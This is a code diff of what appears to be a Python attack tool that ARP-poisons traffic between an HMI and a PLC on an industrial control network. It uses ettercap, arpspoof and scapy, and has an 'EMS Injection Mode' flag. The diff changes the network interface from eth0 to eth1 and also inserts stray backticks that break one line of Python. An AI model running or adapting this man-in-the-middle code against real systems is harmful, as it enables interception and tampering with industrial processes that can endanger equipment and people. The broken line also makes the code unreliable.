@@ -49,7 +49,7 @@ def ip_select():
 
 def get_ip():
     with console.status("1st. ARP-Spoofing PLC... ", spinner="bouncingBall", spinner_style="bold red") as status:
-        arp1 = f'ettercap -Tq -i eth0 -M ARP /{plc_ip["ip"]}//'
+        arp1 = f'ettercap -Tq -i eth1 -M ARP /{plc_ip["ip"]}//'
         subprocess.Popen(arp1, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         time.sleep(1)
     console.log("1st. ARP-Spoofing PLC is Done.")
@@ -62,11 +62,11 @@ def arp_spoofing():
         EMSinjection = True
         console.log("[bold][MAIN][/] EMS Injection Mode Enabled.")
     else:
-        EMSinjection = False
+        EMSinjection = False``
         console.log("[bold][MAIN][/] EMS Injection Mode Disabled.")
 
     with console.status("ARP_Spoofing... ", spinner="bouncingBall", spinner_style="bold red") as status:
-        arp2 = f'ettercap -Tq -i eth0 -M ARP /{hmi_ip["ip"]}// /{plc_ip["ip"]}//'
+        arp2 = f'ettercap -Tq -i eth1 -M ARP /{hmi_ip["ip"]}// /{plc_ip["ip"]}//'
         process = subprocess.Popen(arp2, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         pid = process.pid
         console.log("[green][MAIN][/] Ettercap is running, PID : {}".format(pid))
@@ -82,10 +82,10 @@ def arp_spoofing():
     console.log("[green][MAIN][/] Ettercap ARP_Poisoning is Working.")
 
 def arpspoof_mod(arp1_ip, arp2_ip):
-    arpspoof_command1 = f"arpspoof -i eth0 -t {arp1_ip} {arp2_ip}"
+    arpspoof_command1 = f"arpspoof -i eth1 -t {arp1_ip} {arp2_ip}"
     subprocess.Popen(arpspoof_command1, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     
-def scapy_arpspoof(target_ip, spoof_ip, delay_time, interface='eth0'):
+def scapy_arpspoof(target_ip, spoof_ip, delay_time, interface='eth1'):
     """
     ARPspoofing Mode => Scapy_Arpspoof 增強型ARP欺騙攻擊
     :param target_ip: 受到欺騙之目標主機ip_addr
@@ -101,8 +101,8 @@ def scapy_arpspoof(target_ip, spoof_ip, delay_time, interface='eth0'):
 
 def get_my_ip_mac():
     global my_ip
-    my_ip['ip'] =  get_if_addr('eth0')
-    my_ip['mac'] = get_if_hwaddr('eth0')
+    my_ip['ip'] =  get_if_addr('eth1')
+    my_ip['mac'] = get_if_hwaddr('eth1')
     console.log(f"my_ip: {my_ip['ip']}, my_mac: {my_ip['mac']}")
 
 
